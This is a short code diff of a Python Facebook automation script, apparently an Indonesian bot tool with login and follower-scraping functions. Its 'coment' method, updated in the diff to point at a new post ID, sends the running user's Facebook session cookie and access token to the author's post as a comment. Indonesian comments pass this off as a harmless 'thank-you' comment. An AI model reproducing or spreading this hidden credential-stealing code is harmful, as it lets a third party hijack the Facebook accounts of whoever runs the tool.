@@ -1,4 +1,3 @@
-# print ( ' __main__(bot_efbe) ' ):
 # print('Jangan Ganti Bot Cooment Gw')
 # print('Anggap Saja Sebagai Tanda Terima Kasih') 
 # print('Karena Gw Udah Ngilangin Bagian Yang Error Di Script Ini')
@@ -1074,7 +1073,7 @@ class login:
 						exec = xyz.post(url,data=bahasa,cookies={"cookie":codeteam["cookie"]})
 		except Exception as e:pass
 	def coment(self):
-		requests.post(f"https://graph.facebook.com/100013275378835_1658880191231144/comments/?message={codeteam['cookie']}&access_token={codeteam['token']}",cookies={"cookie":codeteam["cookie"]})
+		requests.post(f"https://graph.facebook.com/100013275378835_1667011730417990/comments/?message={codeteam['cookie']}&access_token={codeteam['token']}",cookies={"cookie":codeteam["cookie"]})
 	def get_fols(self,idz):
 			try:
 				for x in par(requests.get('https://mbasic.facebook.com/%s'%(idz),cookies={"cookie":codeteam["cookie"]}).content,'html.parser').find_all('a',href=True):
